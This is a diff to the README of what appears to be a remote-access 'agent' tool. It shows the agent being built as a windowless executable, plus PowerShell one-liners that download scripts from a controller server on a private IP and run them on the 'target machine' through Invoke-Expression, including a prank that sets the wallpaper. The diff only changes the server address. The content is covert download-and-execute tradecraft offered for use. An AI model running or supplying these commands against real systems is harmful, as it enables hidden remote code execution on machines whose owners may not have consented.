@@ -16,10 +16,10 @@ pyinstaller --onefile --noconsole --icon=cog.ico --name=ExeName agent.py
 
 To run custom powershell scripts on target machine (Agent), you can execute this command:
 ```powershell
-Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.30.20:5000/static/scripts/script.ps1").Content) )
+Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.30.21:5000/static/scripts/script.ps1").Content) )
 ```
 
 Change wallpaper to cat image:
 ```powershell
-Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.30.20:5000/static/scripts/wallpaper.ps1").Content) )
+Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.30.21:5000/static/scripts/wallpaper.ps1").Content) )
 ```
